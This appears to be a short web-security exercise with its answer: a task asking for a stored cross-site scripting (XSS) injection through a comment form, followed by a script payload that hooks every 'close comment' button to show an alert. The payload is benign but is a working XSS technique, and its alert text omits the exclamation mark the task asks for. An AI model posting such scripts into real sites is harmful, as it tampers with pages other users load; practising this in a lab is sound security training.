Could you exploit XSS and inject an alert to be shown when the some of the "close comment" button is pressed? To be more precise, you have to post a comment so that the page you get back has the modified behavior (and you can verify it by pressing the injected button to trigger the alert). The alert must show the message Venom is a good boy!.





<script>
const buttons = document.querySelectorAll(".btn-close");
for (let i of buttons) {
  i.addEventListener("click", (e) => {
    alert("Venom is a good boy");
    }
  )
}

</script>
